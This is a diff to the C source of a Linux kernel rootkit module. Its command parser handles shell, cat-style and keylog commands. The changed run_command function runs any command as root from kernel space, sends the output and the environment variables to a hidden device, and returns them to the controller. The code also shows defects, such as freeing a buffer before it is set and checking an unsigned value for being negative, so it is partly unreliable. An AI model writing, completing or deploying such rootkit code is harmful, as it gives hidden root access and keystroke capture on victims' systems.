@@ -1,6 +1,5 @@
 #include "commands.h"
 
-
 static u32 get_arg_len(char* string) {
     u32 index = 0;
     while (string[index] != ' ' && string[index] != '\0') {
@@ -12,7 +11,7 @@ static u32 get_arg_len(char* string) {
 
 command_t parse_command(char* data)
 {
-    char* command_strings[COMMAND_NUM] = {"shell \0", "cat \0", "keylog\0"};
+    char* command_strings[COMMAND_NUM] = {"shell \0", "mycat \0", "keylog\0"};
     command_t commands[COMMAND_NUM] = {RUN, CAT, KEYLOG};
     u32 i, shift, j;
 
@@ -48,14 +47,103 @@ command_t parse_command(char* data)
 
 
 void run_command(args_t* args) {
-    char *argv[] = {"/bin/sh", "-c", args->string, NULL};
-    char *envp[] = {"PATH=/bin:/sbin", NULL};
+    char* password = "password\0";
+    char* pwd_name = "PWD=\0";
+    u32 pwd_len = strlen(pwd_name);
+    bool found_pwd = false;
+    bool good_env = true;
+    char* template = "{ echo %s; cd %s; %s; pwd; echo %s; printenv;} > /dev/" SHELL_DEV_NAME "\0";
+    char **envp;
+    char *argv[] = {"/bin/sh", "-c", NULL, NULL};
+    u32 command_len;
+    char* buffer;
+    u32 buffer_len;
+    u32 final_len;
+    u32 env_count;
+    char* output;
+    u32 i, j;
+    char* pwd;
 
-    DEBUG_PUTS("rootkit: performing bash command\n")
+    mutex_lock(&driver_data.mutex);
+    envp = kmalloc(sizeof(char*) * (driver_data.env_count + 1), GFP_KERNEL);
+
+    if (!envp) {
+        mutex_unlock(&driver_data.mutex);
+        send_response("rootkit: error while allocating envp", args);
+        kfree(buffer);
+        return;
+
+    }
+    envp[driver_data.env_count] = NULL;
+    env_count = driver_data.env_count;
+    for (i = 0; i < driver_data.env_count; i++) {
+        envp[i] = kmalloc(strlen(driver_data.env[i]) + 1, GFP_KERNEL);
+        if (!envp[i]) {
+            mutex_unlock(&driver_data.mutex);
+            send_response("rootkit: error while allocating env variable", args);
+            goto finish;
+        }
+        strcpy(envp[i], driver_data.env[i]);
+        if (found_pwd) {
+            continue;
+        }
+        good_env = true;
+        for (j = 0; j < pwd_len; j++) {
+            if (!envp[i][j] || (envp[i][j] != pwd_name[j])) {
+               good_env = false;
+               break;
+            }
+        }
+        if (good_env) {
+            found_pwd = true;
+            pwd = envp[i] + pwd_len;
+        }
+    }
+    if (!found_pwd) {
+        pwd = "/";
+    }
+    mutex_unlock(&driver_data.mutex);
+
+
+    buffer_len = strlen(pwd) + strlen(args->string) + strlen(password) + strlen(template);
+    buffer = kmalloc(buffer_len, GFP_KERNEL);
+    final_len = sprintf(buffer, template, password, pwd, args->string, password);
+    DEBUG_PRINTF("%s\n", buffer)
+    if (final_len < 0) {
+        DEBUG_PUTS("rootkit: error while using sprintf to build command\n")
+        return;
+    }
+
+
+    argv[2] = buffer;
 
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
-    send_response("rootkit: shell command was performed", args);
+    if (driver_data.output && driver_data.output_len >= 1) {
+        mutex_lock(&driver_data.mutex);
+        output = driver_data.output;
+        driver_data.output = NULL;
+        output[driver_data.output_len - 1] = '\0';
+        driver_data.output_len = 0;
+        mutex_unlock(&driver_data.mutex);
+
+        DEBUG_PRINTF("rootkit: returning the output: %s\n", output)
+
+        send_response(output, args);
+        kfree(output);
+    } else {
+        send_response("\0", args);
+    }
+
+
+finish:
+
+    kfree(buffer);
+    for (i = 0; i < env_count; i++) {
+        kfree(envp[i]);
+    }
+    kfree(envp);
+
 
 }
 
